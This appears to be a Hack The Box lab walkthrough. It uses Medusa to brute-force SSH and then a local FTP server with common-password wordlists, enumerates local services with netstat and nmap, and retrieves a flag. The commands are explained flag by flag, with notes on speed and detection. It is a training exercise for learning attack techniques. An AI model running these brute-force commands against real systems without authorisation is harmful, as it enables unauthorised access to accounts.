## Kick-off

```shell
3kjS@htb[/htb]$ medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```

- `-h <IP>`: Specifies the target system's IP address.
- `-n <PORT>`: Defines the port on which the SSH service is listening (typically port 22).
- `-u sshuser`: Sets the username for the brute-force attack.
- `-P 2023-200_most_used_passwords.txt`: Points Medusa to a wordlist containing the 200 most commonly used passwords in 2023. The effectiveness of a brute-force attack is often tied to the quality and relevance of the wordlist used.
- `-M ssh`: Selects the SSH module within Medusa, tailoring the attack specifically for SSH authentication.
- `-t 3`: Dictates the number of parallel login attempts to execute concurrently. Increasing this number can speed up the attack but may also increase the likelihood of detection or triggering security measures on the target system.
## Gaining Access

```shell
3kjS@htb[/htb]$ ssh sshuser@<IP> -p PORT
```
### Expanding the Attack Surface

```shell
3kjS@htb[/htb]$ netstat -tulpn | grep LISTEN
```

```shell
3kjS@htb[/htb]$ nmap localhost
```
### Targeting the FTP Server

```shell
3kjS@htb[/htb]$ medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
```

The key differences here are:

- `-h 127.0.0.1`: Targets the local system, as the FTP server is running locally. Using the IP address tells medusa explicitly to use IPv4.
- `-u ftpuser`: Specifies the username `ftpuser`.
- `-M ftp`: Selects the FTP module within Medusa.
- `-t 5`: Increases the number of parallel login attempts to 5.
### Retrieving The Flag

```shell
3kjS@htb[/htb]$ ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost
```
